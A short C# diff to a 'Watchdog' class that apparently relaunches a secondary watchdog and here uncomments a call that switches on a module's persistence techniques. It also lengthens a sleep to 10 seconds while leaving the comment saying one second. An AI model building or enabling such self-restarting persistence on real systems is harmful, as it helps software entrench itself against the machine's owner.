@@ -71,10 +71,10 @@ class Watchdog
             watchdogHelper.watchdogHelper.verifyFilePathsSourceAndDest(SecondaryWatchdogPath, SecondaryWatchdogName);
             watchdogHelper.watchdogHelper.CheckAndRunWatchdog(SecondaryWatchdogPath, SecondaryWatchdogName, SecondaryWatchdogMutexName);
 
-            //Persistence.Persistence.runAllTechniques();
+            Persistence.Persistence.runAllTechniques();
 
             Console.WriteLine("Watchdog is monitoring...");
-            Thread.Sleep(1000);  // Sleep for 1 second
+            Thread.Sleep(10000);  // Sleep for 1 second
         }
     }
 
